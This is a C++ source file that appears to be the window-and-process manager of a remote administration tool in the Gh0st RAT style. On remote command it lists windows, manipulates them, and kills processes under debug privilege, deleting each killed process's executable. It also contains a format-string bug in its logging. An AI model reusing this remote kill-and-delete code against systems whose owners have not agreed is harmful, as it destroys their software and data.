// WindowsManager.cpp: implementation of the CWindowsManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "WindowsManager.h"
 
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool bIsShowHideWindow = false;

CWindowsManager::CWindowsManager(CClientSocket *pClient) : CManager(pClient)
{
	SwitchInputDesktop();
	SendWindowsList();
}

CWindowsManager::~CWindowsManager()
{

}

void CWindowsManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	DWORD hwnd;

	switch (lpBuffer[0])
	{
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendWindowsList();
		break;
	case COMMAND_SHOWVISBLE:
		bIsShowHideWindow = false;
		break;
	case COMMAND_SHOWHIDDEN:
		bIsShowHideWindow = true;
		break;
	case COMMAND_WINDOW_CLOSE:  //向窗口发送关闭消息
		{
			memcpy(&hwnd,lpBuffer + 1,sizeof(DWORD));   //得到窗口句柄 
			::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //向窗口发送关闭消息
		}
		break;
	case COMMAND_WINDOW_DISABLED:
		{
			memcpy(&hwnd,lpBuffer + 1,sizeof(DWORD));   
			EnableWindow((HWND__ *)hwnd,FALSE);
		}
		break;
	case COMMAND_WINDOW_ENABLED:
		{
			memcpy(&hwnd,lpBuffer + 1,sizeof(DWORD)); 
			EnableWindow((HWND__ *)hwnd,TRUE);
		}
		break;
	case COMMAND_WINDOW_TEST:
		{
			int nCmdShow = 0;
			memcpy((void*)&hwnd,lpBuffer + 1,sizeof(DWORD));      //得到窗口句柄
			memcpy(&nCmdShow,lpBuffer + 1 +sizeof(DWORD),sizeof(int));     //得到窗口处理参数
        	ShowWindow((HWND__ *)hwnd,nCmdShow);
		}
		break;
	case COMMAND_WINDOW_CHANGE_TITLE:
		{
			char strTitle[MAX_PATH] = {0};
			memcpy(&hwnd,lpBuffer + 1,sizeof(DWORD)); 
			memcpy(strTitle,(char*)lpBuffer + 1 + sizeof(DWORD), MAX_PATH - 1 - sizeof(DWORD));  
			::SendMessage((HWND__ *)hwnd,WM_SETTEXT,0,(LPARAM)(LPCTSTR)strTitle);
		}
		break;
	default:
		return;
	}
}

void CWindowsManager::SendWindowsList()
{
	LPBYTE	lpBuffer = GetWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	
	LocalFree(lpBuffer);	
}

LPBYTE CWindowsManager::GetWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

#include <tlhelp32.h>
BOOL MyGetProcessImageFileName(DWORD dwPID,char * str)
{
	BOOL nRet = FALSE;
	PROCESSENTRY32 pe32;  
    // 在使用这个结构之前，先设置它的大小  
    pe32.dwSize = sizeof(pe32);   

    // 给系统内的所有进程拍一个快照  
    HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    if(hProcessSnap == INVALID_HANDLE_VALUE)  
    {  
        return -1;  
    }  
    // 遍历进程快照，轮流显示每个进程的信息  
    BOOL bMore = ::Process32First(hProcessSnap, &pe32);  
    while(bMore)  
    {  
		if (pe32.th32ProcessID == dwPID)
		{
			nRet = TRUE;
			lstrcpy(str,pe32.szExeFile);
			break;
		}
        bMore = ::Process32Next(hProcessSnap, &pe32);  
    }  
	
    // 不要忘记清除掉snapshot对象  
    ::CloseHandle(hProcessSnap);  
	return nRet;
}
#include <stdio.h>
void WriteLog(char *fmt,...)
{
	va_list args;
	char sTemp[512] = "";
	
	va_start(args, fmt);
	_vsnprintf(sTemp, sizeof(sTemp), fmt, args);
	va_end(args);
	
	//日期
	SYSTEMTIME sysTime;
	::GetLocalTime(&sysTime);
	
	char sTrace[1024] = "";
	sprintf(sTrace, "[%02u:%02u:%02u: %02u:%02u:%02u] %s\r\n"
		, sysTime.wYear, sysTime.wMonth, sysTime.wDay
		, sysTime.wHour, sysTime.wMinute, sysTime.wSecond
		, sTemp);
	
	printf(sTemp);
	
	//输出到文件
	FILE* pFile = NULL;
	pFile = fopen("C:\\TraceLog.txt", "a");
	fwrite(sTrace, 1, strlen(sTrace), pFile);
	fclose(pFile);
	pFile = NULL;
}

BOOL DebugPrivileges(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

bool CALLBACK CWindowsManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if( NULL == hwnd )
	{
		return true;
	}

	if(!::IsWindow(hwnd) )
		return true;
	
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	
	LPBYTE lpBuffer = *(LPBYTE *)lParam;
	
	char strTitle[1024]={0};
	char strClass[255]={0};
	char strImageName[100] = {0};
	char strState[100] = {0};
	DWORD dwPID = 0;

 
	try
	{
		GetWindowThreadProcessId(hwnd, &dwPID);

		if (GetCurrentProcessId() == dwPID)
		{
			return true;
		}

		::GetWindowText(hwnd,strTitle,sizeof(strTitle)-1);
	//	if (!::SendMessage(hwnd,WM_GETTEXT,sizeof(strTitle)-1,(LPARAM)strTitle))
	//	{
	//		return true;
	//	}

		strTitle[sizeof(strTitle)-1]=0;
		
		if (bIsShowHideWindow == false)
		{
			if (!IsWindowVisible(hwnd))
				return true;
		}
	
		if (lstrlen(strTitle) == 0 )
			lstrcpy(strTitle," ");
	
		
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}
		else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;			
		}


    	::GetClassName(hwnd,strClass,255);
		if (lstrlen(strClass) == 0 )
				lstrcpy(strClass," ");


		if(IsWindowEnabled(hwnd))
			lstrcpy(strState,"Enabled ");
		else
			lstrcpy(strState,"Disabled ");
		
		if(IsWindowVisible(hwnd))
			lstrcat(strState,"Visible");
		else
			lstrcat(strState,"Hidden");
		
		if(IsIconic(hwnd))
			lstrcat(strState,"-Minimized");
		
		if(IsZoomed(hwnd))
			lstrcat(strState,"-Maximize");

		
		MyGetProcessImageFileName(dwPID, strImageName);
		if (lstrlen(strImageName)  == 0)
		{
			lstrcpy(strImageName," ");
		}

		dwLength = sizeof(DWORD)*2+ lstrlen(strTitle) + lstrlen(strClass) + lstrlen(strState) + lstrlen(strImageName)+ 4;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	

	memcpy(lpBuffer + dwOffset ,&hwnd,sizeof(DWORD));
	dwOffset += sizeof(DWORD);

	memcpy(lpBuffer + dwOffset, &dwPID , sizeof(DWORD));
	dwOffset += sizeof(DWORD);

	memcpy(lpBuffer + dwOffset , strTitle, lstrlen(strTitle) + 1);
	dwOffset +=  lstrlen(strTitle) + 1;

	memcpy(lpBuffer + dwOffset , strClass, lstrlen(strClass) + 1);
	dwOffset +=  lstrlen(strClass) + 1;

	memcpy(lpBuffer + dwOffset , strState, lstrlen(strState) + 1);
	dwOffset +=  lstrlen(strState) + 1;

	memcpy(lpBuffer + dwOffset , strImageName , lstrlen(strImageName) + 1);
	dwOffset +=  lstrlen(strImageName) + 1;


	*(LPBYTE *)lParam = lpBuffer;
	return true;
}



#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
void CWindowsManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivileges(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);
		
		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //检查文件不存在  退出
					break;
				n ++ ;
				if(n >= 10)  //无法删除 一段时间后退出
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivileges(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
}
